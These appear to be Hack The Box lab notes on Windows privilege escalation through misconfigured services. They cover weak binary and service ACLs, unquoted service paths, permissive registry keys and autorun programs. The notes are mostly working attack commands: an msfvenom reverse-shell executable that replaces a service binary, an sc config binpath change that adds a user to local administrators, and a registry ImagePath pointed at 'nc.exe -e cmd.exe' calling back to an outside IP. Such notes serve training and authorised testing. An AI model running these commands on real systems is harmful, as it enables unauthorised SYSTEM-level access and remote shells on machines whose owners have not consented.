## Check for service binaries suffering from weak ACLs.
```
https://github.com/GhostPack/SharpUp/
```
```
PS C:\htb> .\SharpUp.exe audit
```
2. Check the DisplayName and the PathName; In our example, The tool identifies the PC Security Management Service, which executes the SecurityService.exe binary when started.
3. Checking Permissions with icacls
```
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
## Replacing Service Binary
1. Generate payload using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.211 LPORT=8443 -f exe > SecurityService.exe
```
2. Transfer the payload
3. Replacing Service Binary
```
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
4. Start netcat listener
```
nc -lvnp 8443
```
5. start the service
```
C:\htb> sc start SecurityService
```
6. Elevated reverse shell obtained
## Reviewing sharpup again, we see the WindscribeService is potentially misconfigured. 
### Checking Permissions with AccessChk
```
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
```
1. Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.
2. Changing the Service Binary Path: We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. 
```
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
3. Stopping Service
```
C:\htb> sc stop WindscribeService
```
4. Starting the Service
```
C:\htb> sc start WindscribeService
```
5. Confirming Local Admin Group Addition
```
net localgroup administrators
```
### Weak Service Permissions - Cleanup
```
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```
Starting the Service Again
```
C:\htb> sc start WindScribeService
```
Verifying Service is Running
```
C:\htb> sc query WindScribeService
```
## Unquoted Service Path
When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders
If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, NT AUTHORITY\SYSTEM
### Searching for Unquoted Service Paths
```
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v ""
```
## Permissive Registry ACLs
### Checking for Weak Service ACLs in Registry
```
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
In our example, we got the following result
```
RW HKLM\System\CurrentControlSet\services\ModelManagerService
```
Changing ImagePath with PowerShell
```
Transfer nc.exe to the target host
```
```
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
## Modifiable Registry Autorun Binary
Check Startup Programs
We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.
```
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```